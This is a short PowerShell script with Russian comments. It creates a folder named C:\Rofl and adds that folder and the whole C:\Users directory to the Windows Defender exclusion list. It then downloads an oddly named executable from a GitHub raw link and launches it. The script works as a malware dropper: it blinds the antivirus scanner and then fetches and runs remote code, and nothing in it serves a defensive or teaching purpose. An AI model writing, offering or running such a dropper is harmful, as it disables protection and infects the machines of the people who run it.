# Создать папку C:\Rofl
$roflPath = 'C:\Rofl'
if (-not (Test-Path $roflPath)) {
    New-Item -Path $roflPath -ItemType Directory
}

# Добавить папки в исключения Защитника Windows
Add-MpPreference -ExclusionPath $roflPath
Add-MpPreference -ExclusionPath 'C:\Users'

# Скачать файл по прямой ссылке
$fileUrl = 'https://github.com/bebankes1/refusiao/raw/refs/heads/main/opthjasdrg.exe'
$outputFile = "$roflPath\file.exe"
Invoke-WebRequest -Uri $fileUrl -OutFile $outputFile

# Запустить скачанный файл
Start-Process -FilePath $outputFile